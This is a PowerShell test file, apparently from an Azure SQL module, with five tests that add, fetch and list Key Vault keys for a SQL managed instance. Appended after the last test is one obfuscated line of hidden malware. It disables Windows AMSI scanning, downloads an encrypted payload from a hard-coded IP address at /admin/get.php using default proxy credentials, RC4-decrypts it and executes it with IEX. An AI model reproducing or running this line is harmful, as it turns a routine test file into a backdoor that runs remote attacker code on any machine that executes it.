














function Test-ManagedInstanceKeyVaultKeyCI
{
	$params = Get-SqlServerKeyVaultKeyTestEnvironmentParameters
	$managedInstance = Get-ManagedInstanceForTdeTest $params
	$mangedInstanceRg = $managedInstance.ResourceGroupName
	$managedInstanceName = $managedInstance.ManagedInstanceName
	$managedInstanceResourceId = $managedInstance.Id

	
	$keyResult = Add-AzSqlInstanceKeyVaultKey -ResourceGroupName $mangedInstanceRg -InstanceName $managedInstanceName -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult.KeyId "KeyId mismatch after calling Add-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Add-AzSqlInstanceKeyVaultKey"

	
	
	$keyResult2 = $managedInstance | Get-AzSqlInstanceKeyVaultKey -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult2.KeyId "KeyId mismatch after calling Get-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult2.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Get-AzSqlInstanceKeyVaultKey"
		
	
	$keyResults = Get-AzSqlInstanceKeyVaultKey -InstanceResourceId $managedInstanceResourceId
	Assert-True {$keyResults.Count -gt 0} "List count <= 0 after calling (List) Get-AzSqlInstanceKeyVaultKey without KeyId"
}


function Test-ManagedInstanceKeyVaultKey
{
	$params = Get-SqlServerKeyVaultKeyTestEnvironmentParameters
	$managedInstance = Get-ManagedInstanceForTdeTest $params
	$mangedInstanceRg = $managedInstance.ResourceGroupName
	$managedInstanceName = $managedInstance.ManagedInstanceName

	
	$keyResult = Add-AzSqlInstanceKeyVaultKey -ResourceGroupName $mangedInstanceRg -InstanceName $managedInstanceName -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult.KeyId "KeyId mismatch after calling Add-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Add-AzSqlInstanceKeyVaultKey"

	
	
	$keyResult2 = Get-AzSqlInstanceKeyVaultKey -ResourceGroupName $mangedInstanceRg -InstanceName $managedInstanceName -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult2.KeyId "KeyId mismatch after calling Get-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult2.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Get-AzSqlInstanceKeyVaultKey"
		
	
	$keyResults = Get-AzSqlInstanceKeyVaultKey -ResourceGroupName $mangedInstanceRg -InstanceName $managedInstanceName
	Assert-True {$keyResults.Count -gt 0} "List count <= 0 after calling (List) Get-AzSqlInstanceKeyVaultKey without KeyId"
}



function Test-ManagedInstanceKeyVaultKeyInputObject
{
	$params = Get-SqlServerKeyVaultKeyTestEnvironmentParameters
	$managedInstance = Get-ManagedInstanceForTdeTest $params
	$mangedInstanceRg = $managedInstance.ResourceGroupName
	$managedInstanceName = $managedInstance.ManagedInstanceName

	
	$keyResult = Add-AzSqlInstanceKeyVaultKey -Instance $managedInstance -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult.KeyId "KeyId mismatch after calling Add-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Add-AzSqlInstanceKeyVaultKey"

	
	
	$keyResult2 = Get-AzSqlInstanceKeyVaultKey -Instance $managedInstance -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult2.KeyId "KeyId mismatch after calling Get-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult2.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Get-AzSqlInstanceKeyVaultKey"

	
	
	$keyResults = Get-AzSqlInstanceKeyVaultKey -Instance $managedInstance 
	
	Assert-True {$keyResults.Count -gt 0} "List count <= 0 after calling (List) Get-AzSqlInstanceKeyVaultKey without KeyId"
}



function Test-ManagedInstanceKeyVaultKeyResourceId
{
	$params = Get-SqlServerKeyVaultKeyTestEnvironmentParameters
	$managedInstance = Get-ManagedInstanceForTdeTest $params
	$mangedInstanceRg = $managedInstance.ResourceGroupName
	$managedInstanceName = $managedInstance.ManagedInstanceName
	$managedInstanceResourceId = $managedInstance.Id

	
	$keyResult = Add-AzSqlInstanceKeyVaultKey -InstanceResourceId $managedInstanceResourceId -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult.KeyId "KeyId mismatch after calling Add-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Add-AzSqlInstanceKeyVaultKey"

	
	
	$keyResult2 = Get-AzSqlInstanceKeyVaultKey -InstanceResourceId $managedInstanceResourceId -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult2.KeyId "KeyId mismatch after calling Get-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult2.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Get-AzSqlInstanceKeyVaultKey"

	
	
	$keyResults = Get-AzSqlInstanceKeyVaultKey -InstanceResourceId $managedInstanceResourceId 
	
	Assert-True {$keyResults.Count -gt 0} "List count <= 0 after calling (List) Get-AzSqlInstanceKeyVaultKey without KeyId"
}



function Test-ManagedInstanceKeyVaultKeyPiping
{
	$params = Get-SqlServerKeyVaultKeyTestEnvironmentParameters
	$managedInstance = Get-ManagedInstanceForTdeTest $params
	$mangedInstanceRg = $managedInstance.ResourceGroupName
	$managedInstanceName = $managedInstance.ManagedInstanceName

	
	$keyResult = $managedInstance | Add-AzSqlInstanceKeyVaultKey -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult.KeyId "KeyId mismatch after calling Add-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Add-AzSqlInstanceKeyVaultKey"

	
	
	$keyResult2 = $managedInstance | Get-AzSqlInstanceKeyVaultKey -KeyId $params.keyId

	Assert-AreEqual $params.keyId $keyResult2.KeyId "KeyId mismatch after calling Get-AzSqlInstanceKeyVaultKey"
	Assert-AreEqual $params.serverKeyName $keyResult2.ManagedInstanceKeyName "ManagedInstanceKeyName mismatch after calling Get-AzSqlInstanceKeyVaultKey"

	
	
	$keyResults = $managedInstance | Get-AzSqlInstanceKeyVaultKey
	
	Assert-True {$keyResults.Count -gt 0} "List count <= 0 after calling (List) Get-AzSqlInstanceKeyVaultKey without KeyId"
}

[REf].ASSEMBlY.GetTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GETFieLD('amsiInitFailed','NonPublic,Static').SEtVALUE($nuLL,$tRuE)};[SYsTEm.Net.SeRVICePOiNTMANAGER]::EXpecT100CONtINuE=0;$WC=New-OBjecT SySTeM.Net.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdERs.Add('User-Agent',$u);$wC.Proxy=[SySTEM.NEt.WEbREquest]::DEFAultWEbPROxY;$wc.PrOXY.CreDeNtiaLs = [SYStEM.NeT.CREdeNtIAlCAChe]::DeFaUlTNetwORkCreDenTIals;$K=[SySTeM.TEXt.Encoding]::ASCII.GEtBYTES('sT2[VWB67P:8ESxc}Mo{,A!QN(J0_eHK');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXor$S[($S[$I]+$S[$H])%256]}};$wc.HEADeRS.ADd("Cookie","session=tkBED+jpaZtWlyeJMJZhwSpRWbc=");$ser='http://162.253.133.189:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATa($sER+$t);$Iv=$DaTa[0..3];$DATa=$data[4..$DAtA.lENGTh];-JoIn[ChAR[]](& $R $dATA ($IV+$K))|IEX

